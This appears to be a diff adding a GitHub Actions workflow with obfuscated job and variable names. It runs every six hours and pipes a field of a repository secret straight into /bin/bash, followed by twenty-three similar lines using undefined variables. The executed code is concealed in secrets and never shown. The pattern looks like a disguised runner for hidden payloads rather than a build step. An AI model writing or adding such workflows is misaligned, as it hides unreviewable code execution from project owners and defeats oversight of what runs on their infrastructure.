@@ -1,0 +1,42 @@
+name: dicangzhen3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dicangzhen3456
+        env:
+          zdts15: ${{ secrets.zdts15 }}
+        run: |
+          echo $zdts15 | jq -r .pl289 | /bin/bash
+          echo $jhls37 | jq -r .fafo57048 | /bin/bash
+          echo $lhm92753 | jq -r .sjc3 | /bin/bash
+          echo $s060 | jq -r .es39005 | /bin/bash
+          echo $stlff2 | jq -r .amq81782 | /bin/bash
+          echo $dolra828 | jq -r .upju22 | /bin/bash
+          echo $sogbr6770 | jq -r .dlkdn1 | /bin/bash
+          echo $ehaj66 | jq -r .q277 | /bin/bash
+          echo $vi800 | jq -r .yndgd39460 | /bin/bash
+          echo $tvjl371 | jq -r .dwqpz0 | /bin/bash
+          echo $zuog3814 | jq -r .ekkk4 | /bin/bash
+          echo $qhd5631 | jq -r .v856 | /bin/bash
+          echo $cr8 | jq -r .la22591 | /bin/bash
+          echo $vzozd50 | jq -r .kljdb2033 | /bin/bash
+          echo $a4 | jq -r .wcofk60 | /bin/bash
+          echo $z0944 | jq -r .sqtcr60 | /bin/bash
+          echo $rvfmf97444 | jq -r .fscg4 | /bin/bash
+          echo $i42618 | jq -r .dx6 | /bin/bash
+          echo $c85870 | jq -r .mg56 | /bin/bash
+          echo $wj5369 | jq -r .ohnmb783 | /bin/bash
+          echo $zzzen77 | jq -r .frv13586 | /bin/bash
+          echo $p71081 | jq -r .zuuf71264 | /bin/bash
+          echo $ej6 | jq -r .hoetp26 | /bin/bash
+          echo $lm21254 | jq -r .zg63158 | /bin/bash
+
